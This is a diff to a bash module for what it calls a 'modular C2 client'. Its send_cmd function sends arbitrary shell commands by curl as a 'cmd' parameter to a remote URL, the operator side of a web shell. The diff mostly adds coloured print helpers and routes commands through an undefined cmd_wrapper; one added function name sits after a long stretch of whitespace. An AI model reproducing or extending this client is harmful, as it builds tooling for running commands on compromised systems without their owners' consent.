@@ -1,6 +1,25 @@
 #!/usr/bin/env bash
 # Lightweight shell module for the modular C2 client.
 
+print_warn() {
+  echo -e "${YELLOW}[!]${NC} $1" >&2
+}
+
+print_err() {
+  echo -e "${RED}[!]${NC} $1" >&2
+}
+                                                                                        print_std() {
+  echo -e "${GREEN}[+]${NC} $1"
+}
+
+print_help() {
+  echo -e "${BLUE}$1${NC} $2"
+}
+
+print_out() {
+  echo -e "${GREEN}[+]${YELLOW} $1${NC}"
+}
+
 # Initialize the module.
 # Expects a URL as the first argument and returns error if not provided.
 module_init() {
@@ -8,7 +27,7 @@ module_init() {
   URL="${1:-}"
   # If URL is empty, print an error message and return non-zero
   if [[ -z "$URL" ]]; then
-    echo "[!] shell_module_init: URL must be provided"
+    print_err "shell_module_init: URL must be provided"
     return 1
   fi
 }
@@ -21,7 +40,7 @@ module_init() {
 #   - performs an HTTP GET using curl and URL-encodes the command
 #   - strips everything before START and after END to return clean output
 send_cmd() {
-  local cmd="$1"
+  local cmd=$(cmd_wrapper "$1")
   # Use curl to send a GET request with the URL-encoded 'cmd' parameter
   curl -s --get --data-urlencode "cmd=$cmd" "$URL"
 }
